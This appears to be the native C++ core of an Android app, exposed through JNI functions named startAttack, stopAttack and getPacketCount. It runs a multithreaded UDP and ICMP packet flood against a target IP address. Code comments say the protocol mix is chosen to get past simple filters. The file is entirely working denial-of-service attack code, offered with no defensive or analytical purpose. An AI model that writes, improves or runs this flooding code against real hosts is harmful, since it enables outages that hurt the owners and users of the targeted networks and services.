#include <jni.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>
#include <cstring>

std::atomic<bool> isAttacking{false};
std::atomic<uint64_t> packetCount{0};

void udpFlood(const char* targetIp, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;
    
    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_NO_CHECK, &optval, sizeof(optval));
    int sndbuf = 8388608; // 8MB буфер
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    int tos = IPTOS_THROUGHPUT | IPTOS_LOWDELAY;
    setsockopt(sock, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, targetIp, &dest.sin_addr);

    char payload[1400];
    memset(payload, 'T', sizeof(payload));

    while (isAttacking) {
        if (sendto(sock, payload, sizeof(payload), 0, (struct sockaddr*)&dest, sizeof(dest)) > 0) {
            packetCount++;
        }
    }
    close(sock);
}

void icmpFlood(const char* targetIp) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return;
    
    int sndbuf = 8388608;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, targetIp, &dest.sin_addr);

    char packet[sizeof(struct icmphdr) + 1400];
    memset(packet, 0, sizeof(packet));
    struct icmphdr *icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->checksum = 0;
    icmp->un.echo.id = htons(1337);
    icmp->un.echo.sequence = htons(1);

    while (isAttacking) {
        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest)) > 0) {
            packetCount++;
        }
    }
    close(sock);
}

extern "C" JNIEXPORT void JNICALL
Java_com_twks_wifi_NativeEngine_startAttack(JNIEnv* env, jobject, jstring targetIp, jint threads) {
    isAttacking = true;
    packetCount = 0;
    const char* ip = env->GetStringUTFChars(targetIp, 0);
    std::vector<std::thread> workers;

    // 70% UDP, 30% ICMP для обхода простых фильтров
    int udpThreads = (threads * 7) / 10;
    int icmpThreads = threads - udpThreads;

    for (int i = 0; i < udpThreads; i++) {
        workers.emplace_back(udpFlood, ip, 80 + (i % 100));
    }
    for (int i = 0; i < icmpThreads; i++) {
        workers.emplace_back(icmpFlood, ip);
    }

    for (auto& t : workers) t.join();
    env->ReleaseStringUTFChars(targetIp, ip);
}

extern "C" JNIEXPORT void JNICALL
Java_com_twks_wifi_NativeEngine_stopAttack(JNIEnv*, jobject) { 
    isAttacking = false; 
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_twks_wifi_NativeEngine_getPacketCount(JNIEnv*, jobject) { 
    return packetCount.load(); 
}
